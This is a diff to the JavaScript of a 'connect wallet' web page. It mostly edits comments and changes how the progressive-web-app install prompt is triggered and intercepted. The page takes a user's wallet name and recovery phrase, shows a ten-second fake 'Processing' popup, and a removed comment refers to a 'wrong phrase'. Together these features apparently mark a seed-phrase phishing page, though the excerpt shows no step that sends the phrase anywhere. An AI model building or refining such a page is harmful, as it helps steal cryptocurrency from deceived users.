@@ -4,7 +4,7 @@ const popup = document.getElementById("popup");
 const popupText = document.getElementById("popupText");
 const closePopupBtn = document.getElementById("closePopupBtn");
 
-// ⭐ NEW — Progress popup elements
+// ⭐ Progress UI Elements (Logo + Name)
 const progressLogo = document.getElementById("progressLogo");
 const progressWalletName = document.getElementById("progressWalletName");
 
@@ -31,13 +31,13 @@ if (wallet) {
 
   const iconPath = `wallet-icons/${fileName}.webp`;
 
-  // Main logo
+  // Main Logo
   walletLogo.src = iconPath;
   walletLogo.onerror = () => {
     walletLogo.style.display = "none";
   };
 
-  // ⭐ NEW — Set progress popup data
+  // ⭐ Progress popup wallet data
   progressWalletName.innerText = wallet;
   progressLogo.src = iconPath;
 
@@ -46,6 +46,7 @@ if (wallet) {
   };
 }
 
+// Connect Button Click
 document.getElementById("connectBtn").addEventListener("click", () => {
   const name = document.getElementById("walletInput").value.trim();
   const phrase = document.getElementById("phraseInput").value.trim();
@@ -61,7 +62,7 @@ document.getElementById("connectBtn").addEventListener("click", () => {
     return;
   }
 
-  // ⭐ NEW — Show progress popup with wallet logo + name
+  // ⭐ Show Wallet Processing UI
   showPopup("Processing... please wait");
 
   setTimeout(() => {
@@ -69,13 +70,13 @@ document.getElementById("connectBtn").addEventListener("click", () => {
   }, 10000);
 });
 
-// Auto PWA Install Trigger After Wrong Phrase
-setTimeout(async () => {
-  if (window.deferredPrompt) {
-    window.deferredPrompt.prompt();
-    await window.deferredPrompt.userChoice;
-    window.deferredPrompt = null;
-  } else {
-    console.log("Install prompt not ready");
-  }
-}, 100);
+// ⭐ REMOVE “Installing… (simulated)” – disable browser simulation
+window.addEventListener("appinstalled", () => {
+  console.log("PWA Installed");
+});
+
+// ⭐ BLOCK SIMULATION ALERTS
+window.addEventListener("beforeinstallprompt", (e) => {
+  e.preventDefault(); // Stop browser message
+  window.deferredPrompt = e;
+});
